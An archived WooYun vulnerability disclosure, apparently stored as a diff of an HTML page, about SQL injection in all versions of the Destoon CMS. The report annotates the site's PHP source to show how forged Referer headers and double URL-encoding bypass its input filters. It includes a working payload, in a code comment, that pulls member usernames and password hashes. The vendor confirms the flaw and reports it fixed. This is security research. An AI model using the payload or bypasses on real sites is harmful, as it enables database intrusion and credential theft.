@@ -1,0 +1,299 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		Destoon全版本通杀SQL注入2  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		Destoon全版本通杀SQL注入2  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Chora">Chora</a> 
+</li><li>提交时间：		2013-12-18 21:57</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-12-18：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-12-19：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-12-22：	细节向第三方安全合作伙伴开放<br/>
+									2013-12-29：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-01-08：	细节向普通白帽子公开<br/>
+									2014-01-28：	细节向实习白帽子公开<br/>
+									2014-03-18：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">要过年了，加班加点的。个人觉得不应该仅仅只检测用户的输入，而应该在SQL查询前进行检测才能更好的起到防注入的效果吧，因为人总是有遗漏的。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">common.inc.php 0x00<br />
+<br />
+</p><pre><code>if(!empty($_SERVER[&#039;REQUEST_URI&#039;])) strip_uri($_SERVER[&#039;REQUEST_URI&#039;]);//跟进0x01<br />
+if($_POST) { $_POST = strip_sql($_POST); strip_key($_POST); }<br />
+if($_GET) { $_GET = strip_sql($_GET); strip_key($_GET); }<br />
+...<br />
+if($_POST) extract($_POST, EXTR_SKIP);<br />
+if($_GET) extract($_GET, EXTR_SKIP);<br />
+...<br />
+$DT_REF = get_env(&#039;referer&#039;); //跟进0x01<br />
+...<br />
+$forward = isset($forward) ? urldecode($forward) : $DT_REF;//注入1跟进0x02,没有设置forward的话就用referer替代，而referer是由我们控制的而且不受GPC影响，也不受过滤的影响。<br />
+...<br />
+$kw = isset($_GET[&#039;kw&#039;]) ? htmlspecialchars(str_replace(array(&quot;\&#039;&quot;), array(&#039;&#039;), trim(urldecode($_GET[&#039;kw&#039;])))) : &#039;&#039;; <br />
+//注入2跟进0x03,这里程序员实际意思是想把&#039;替换成空，应该这么写array(&#039;\&#039;&#039;),但是他用的双引号，意思就是将\&#039;替换成空，这里可以我们通过urldecode成功绕过通用防注入跟引入单引号。程序检查了REQUEST_URI里不能含有&#039;,所以这个只有在IIS的平台下，并且是要以cgi/fastcgi运行才不会获取到数据从而绕过。<br />
+//http://support.microsoft.com/kb/954946/zh-cn<br />
+//http://support.microsoft.com/kb/2277918/zh-cn<br />
+$keyword = $kw ? str_replace(array(&#039; &#039;, &#039;*&#039;), array(&#039;%&#039;, &#039;%&#039;), $kw) : &#039;&#039;;//空格替换成%,用%09绕过就行了。<br />
+...</code></pre><p class='detail'><br />
+<br />
+include/global.func.php 0x01<br />
+<br />
+</p><pre><code>function strip_uri($uri) {<br />
+	if(strpos($uri, &#039;%&#039;) !== false) {<br />
+		while($uri != urldecode($uri)) {<br />
+			$uri = urldecode($uri);<br />
+		}<br />
+	}<br />
+	if(strpos($uri, &#039;&lt;&#039;) !== false || strpos($uri, &quot;&#039;&quot;) !== false || strpos($uri, &#039;&quot;&#039;) !== false || strpos($uri, &#039;0x&#039;) !== false) {  //不能出现&#039;<br />
+		dhttp(403, 0);<br />
+		dalert(&#039;HTTP 403 Forbidden&#039;, DT_PATH);<br />
+	}<br />
+}<br />
+<br />
+function strip_sql($string) {//由于可伪造referer，还有可以通过urldecode解码绕过，无视下面。<br />
+	$search = array(&quot;/union/i&quot;,&quot;/0x([a-z0-9]{2,})/i&quot;,&quot;/select([[:space:]\*\/\-])/i&quot;,&quot;/update([[:space:]\*\/])/i&quot;,&quot;/replace([[:space:]\*\/])/i&quot;,&quot;/delete([[:space:]\*\/])/i&quot;,&quot;/drop([[:space:]\*\/])/i&quot;,&quot;/outfile([[:space:]\*\/])/i&quot;,&quot;/dumpfile([[:space:]\*\/])/i&quot;,&quot;/load_file\(/i&quot;,&quot;/substring\(/i&quot;,&quot;/substr\(/i&quot;,&quot;/concat\(/i&quot;,&quot;/concat_ws\(/i&quot;,&quot;/ascii\(/i&quot;,&quot;/hex\(/i&quot;,&quot;/ord\(/i&quot;,&quot;/char\(/i&quot;);<br />
+	$replace = array(&#039;unio&amp;#110;&#039;,&#039;0&amp;#120;\\1&#039;,&#039;selec&amp;#116;\\1&#039;,&#039;updat&amp;#101;\\1&#039;,&#039;replac&amp;#101;\\1&#039;,&#039;delet&amp;#101;\\1&#039;,&#039;dro&amp;#112;\\1&#039;,&#039;outfil&amp;#101;\\1&#039;,&#039;dumpfil&amp;#101;\\1&#039;,&#039;load_fil&amp;#101;(&#039;,&#039;substrin&amp;#103;(&#039;,&#039;subst&amp;#114;(&#039;,&#039;conca&amp;#116;(&#039;,&#039;concat_w&amp;#115;(&#039;,&#039;asci&amp;#105;(&#039;,&#039;he&amp;#120;(&#039;,&#039;or&amp;#100;(&#039;,&#039;cha&amp;#114;(&#039;);<br />
+	return is_array($string) ? array_map(&#039;strip_sql&#039;, $string) : preg_replace($search, $replace, $string);<br />
+}<br />
+function get_env($type) {<br />
+	switch($type) {<br />
+		case &#039;ip&#039;:<br />
+...<br />
+		case &#039;referer&#039;:<br />
+			return isset($_SERVER[&#039;HTTP_REFERER&#039;]) ? $_SERVER[&#039;HTTP_REFERER&#039;] : &#039;&#039;;//可伪造。<br />
+...</code></pre><p class='detail'><br />
+<br />
+module/member/chat.inc.php 0x02<br />
+<br />
+</p><pre><code>if($chat) {<br />
+				//对话已经存在<br />
+<br />
+				if($chat[&#039;touser&#039;] == $_username) {//当前为接收人<br />
+					if($DT_TIME - $chat[&#039;freadtime&#039;] &gt; $MOD[&#039;chat_poll&#039;]*3) {//发起对话人已经断开<br />
+						$db-&gt;query(&quot;UPDATE {$table} SET fromuser=&#039;$chat_fromuser&#039;,touser=&#039;$chat_touser&#039;,tgettime=0 WHERE chatid=&#039;$chatid&#039;&quot;);<br />
+					} else {//发起人在线<br />
+						dheader(&#039;?chatid=&#039;.$chatid);<br />
+					}<br />
+					//<br />
+				} else {//当前为发起人<br />
+					if($DT_TIME - $chat[&#039;treadtime&#039;] &gt; $MOD[&#039;chat_poll&#039;]*3) {//接收人已经断开<br />
+						$db-&gt;query(&quot;UPDATE {$table} SET tgettime=0 WHERE chatid=&#039;$chatid&#039;&quot;);<br />
+					} else {//接收人在线<br />
+						//<br />
+					}<br />
+				}<br />
+			} else {<br />
+				$forward = dsafe($forward);<br />
+				if(strpos($forward, $MOD[&#039;linkurl&#039;]) !== false) $forward = &#039;&#039;;<br />
+				//创建一个新对话<br />
+				$db-&gt;query(&quot;INSERT INTO {$table} (chatid,fromuser,touser,tgettime,forward) VALUES (&#039;$chat_id&#039;,&#039;$chat_fromuser&#039;,&#039;$chat_touser&#039;,&#039;0&#039;,&#039;$forward&#039;)&quot;); //伪造referer注射。<br />
+/*<br />
+wooyun&#039;),(12345679801234567890123456789012,(select concat(username,0x2C,password) from destoon_member limit 0,1),&#039;test2test&#039;,4,&#039;5<br />
+访问<br />
+http://localhost/de/member/chat.php?chatid=12345678901234567890123456789012<br />
+就能看到注入返回的数据了。<br />
+*/<br />
+			}<br />
+		} else if(isset($chatid) &amp;&amp; is_md5($chatid)) {<br />
+			$chat = $db-&gt;get_one(&quot;SELECT * FROM {$table} WHERE chatid=&#039;$chatid&#039;&quot;);<br />
+			if($chat &amp;&amp; $chat[&#039;touser&#039;] == $_username) {<br />
+				$chat_id = $chatid;<br />
+				$chat_status = 3;<br />
+				if(check_name($chat[&#039;fromuser&#039;])) {<br />
+					if($DT_TIME - $chat[&#039;freadtime&#039;] &gt; $MOD[&#039;chat_poll&#039;]*3) {//发起对话人已经断开<br />
+						$db-&gt;query(&quot;UPDATE {$table} SET tgettime=0 WHERE chatid=&#039;$chatid&#039;&quot;);<br />
+						dheader(&#039;chat.php?touser=&#039;.$chat[&#039;fromuser&#039;]);<br />
+					}<br />
+					$user = userinfo($chat[&#039;fromuser&#039;]);<br />
+					$online = online($user[&#039;userid&#039;]);<br />
+					$user[&#039;type&#039;] = &#039;member&#039;;<br />
+				} else {<br />
+					$user = array();<br />
+					$user[&#039;type&#039;] = &#039;guest&#039;;<br />
+					$user[&#039;ip&#039;] = $chat[&#039;fromuser&#039;];<br />
+					$user[&#039;area&#039;] = ip2area($chat[&#039;fromuser&#039;]);<br />
+					if($DT_TIME - $chat[&#039;freadtime&#039;] &gt; $MOD[&#039;chat_poll&#039;]*3) {//发起人是游客，并且已经断开，只能查看记录<br />
+						$time = $DT_TIME - $MOD[&#039;chat_poll&#039;]*4;<br />
+						$db-&gt;query(&quot;UPDATE {$table} SET freadtime=&#039;$time&#039; WHERE chatid=&#039;$chatid&#039;&quot;);<br />
+					}<br />
+				}<br />
+				$head_title = &#039;与&#039;.($user[&#039;type&#039;] == &#039;guest&#039; ? &#039;【游客】&#039; : $chat[&#039;fromuser&#039;]).&#039;对话中&#039;;<br />
+			} else {<br />
+				dheader(&#039;chat.php&#039;);<br />
+			}<br />
+			$type = 2;<br />
+		}</code></pre><p class='detail'><br />
+<br />
+api/select.php 0x03<br />
+<br />
+</p><pre><code>login();<br />
+if($action == &#039;item&#039;) {<br />
+	$mid &gt; 3 or dheader(&#039;DT_PATH&#039;);	<br />
+	$from = isset($from) ? trim($from) : &#039;item&#039;;<br />
+	isset($username) or $username = &#039;&#039;;<br />
+	$condition = $mid == 4 ? &#039;groupid&gt;5&#039; : &#039;status=3&#039;;<br />
+	if($keyword) $condition .= &quot; AND keyword LIKE &#039;%$keyword%&#039;&quot;;//在上面说的条件下，就可以成功引入单引号，双编码注射,比如select就可以编码成selec%2574绕过。<br />
+	if($from == &#039;relate&#039; &amp;&amp; $mid == 16) {<br />
+		check_name($username) or exit;<br />
+		$condition .= &quot; AND username=&#039;$username&#039;&quot;;<br />
+	} else {<br />
+		if($_groupid == 1) {<br />
+			if($from == &#039;member&#039;) $condition .= &quot; AND username=&#039;$_username&#039;&quot;;<br />
+		} else {<br />
+			$condition .= &quot; AND username=&#039;$_username&#039;&quot;;<br />
+		}<br />
+	}<br />
+	if($itemid) $condition .= $mid == 4 ? &quot; AND userid=$itemid&quot; : &quot; AND itemid=$itemid&quot;;<br />
+	$order = $mid == 4 ? &#039;userid DESC&#039; : &#039;addtime DESC&#039;;<br />
+	$table = get_table($mid);<br />
+	$r = $db-&gt;get_one(&quot;SELECT COUNT(*) AS num FROM {$table} WHERE $condition&quot;);//带入查询。<br />
+	$items = $r[&#039;num&#039;];<br />
+	$pages = pages($items, $page, $pagesize);<br />
+	$lists = array();<br />
+	$result = $db-&gt;query(&quot;SELECT * FROM {$table} WHERE $condition ORDER BY $order LIMIT $offset,$pagesize&quot;);</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/1821124372de587409e751d9148f18aa7451cd92.png" target="_blank"><img src="../images/1821124372de587409e751d9148f18aa7451cd92.png" alt="1.png" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/18211254ae468f7511b2479e8909ebea9952e0e5.png" target="_blank"><img src="../images/18211254ae468f7511b2479e8909ebea9952e0e5.png" alt="2.png" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/18211304620eb9b50ce4dcae211ff85055489464.png" target="_blank"><img src="../images/18211304620eb9b50ce4dcae211ff85055489464.png" alt="3.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">求保养，继续奋斗。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Chora" title="Chora">Chora</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-046387" title="Destoon全版本通杀SQL注入2">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2013-12-19 16:07</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">已确认存在，我们会尽快修复</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+																	<p class="detail">2013-12-20：感谢Chora，已修复，详见：http://bbs.destoon.com/thread-55559-1-1.html</p>
+											
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="46387";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
